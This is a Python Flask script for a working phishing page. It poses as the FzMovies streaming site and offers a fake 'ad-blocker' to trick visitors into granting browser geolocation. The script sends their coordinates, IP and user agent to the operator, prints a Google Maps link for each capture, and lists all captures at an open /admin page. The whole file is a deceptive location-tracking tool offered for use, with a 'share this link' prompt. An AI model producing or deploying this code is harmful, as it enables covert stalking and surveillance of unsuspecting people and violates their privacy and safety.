from flask import Flask, request, render_template_string
import json
from datetime import datetime

app = Flask(__name__)

# Store captured locations
locations = []

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>FzMovies - Stream Free Movies</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 30px;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            margin: 0;
        }
        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #e94560;
            margin-bottom: 10px;
        }
        .container {
            background: rgba(255,255,255,0.05);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            max-width: 500px;
            margin: 0 auto;
            border: 1px solid rgba(255,255,255,0.1);
        }
        h2 {
            color: #e94560;
            margin-top: 0;
        }
        p {
            line-height: 1.6;
            margin: 15px 0;
        }
        .feature {
            background: rgba(233,69,96,0.1);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 3px solid #e94560;
        }
        button {
            background: #e94560;
            color: white;
            padding: 15px 40px;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
            transition: all 0.3s;
        }
        button:hover {
            background: #d63651;
            transform: scale(1.05);
        }
        #status {
            margin-top: 15px;
            font-size: 16px;
        }
        .loading {
            color: #ffd700;
        }
    </style>
</head>
<body>
    <div class="logo">🎬 FzMovies</div>
    <div class="container">
        <h2>🚀 Premium Ad-Free Experience</h2>
        <p>Tired of annoying ads interrupting your movies?</p>
        
        <div class="feature">
            <strong>Smart Ad-Blocker Technology</strong>
            <p style="font-size: 14px; margin: 10px 0;">We route your connection through the nearest ad-filtering server based on your location for zero buffering and instant ad removal.</p>
        </div>
        
        <p>✨ Enjoy unlimited movies without a single ad</p>
        <p>⚡ Lightning-fast streaming</p>
        
        <button onclick="getLocation()">🛡️ Activate Ad-Blocker</button>
        <p id="status"></p>
    </div>
    
    <script>
        function getLocation() {
            const status = document.getElementById('status');
            
            if (!navigator.geolocation) {
                status.textContent = '❌ Location services required for ad-blocker';
                return;
            }
            
            status.className = 'loading';
            status.textContent = '🔍 Finding nearest server...';
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    status.textContent = '⚙️ Configuring ad-blocker...';
                    
                    // Send to server
                    fetch('/capture', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            latitude: lat,
                            longitude: lon,
                            accuracy: accuracy,
                            user_agent: navigator.userAgent
                        })
                    }).then(() => {
                        status.textContent = '✅ Ad-Blocker Active! Redirecting to movies...';
                        // Redirect to real FzMovies site after 2 seconds
                        setTimeout(() => {
                            window.location.href = 'https://fzmovies-com.lol/';
                        }, 2000);
                    });
                },
                (error) => {
                    status.textContent = '❌ Location access needed to connect to ad-blocking server';
                }
            );
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    data['ip'] = request.remote_addr
    locations.append(data)
    
    print("\n🎯 LOCATION CAPTURED!")
    print(f"Time: {data['timestamp']}")
    print(f"IP: {data['ip']}")
    print(f"Latitude: {data['latitude']}")
    print(f"Longitude: {data['longitude']}")
    print(f"Accuracy: {data['accuracy']} meters")
    print(f"User Agent: {data['user_agent']}")
    print(f"Google Maps: https://www.google.com/maps?q={data['latitude']},{data['longitude']}")
    print("-" * 50)
    
    return {'status': 'success'}

@app.route('/admin')
def admin():
    return json.dumps(locations, indent=2)

if __name__ == '__main__':
    print("🚀 Location tracker running!")
    print("📱 Share this link: http://YOUR_IP:5000")
    print("📊 View captures at: http://YOUR_IP:5000/admin")
    app.run(host='0.0.0.0', port=5000, debug=True)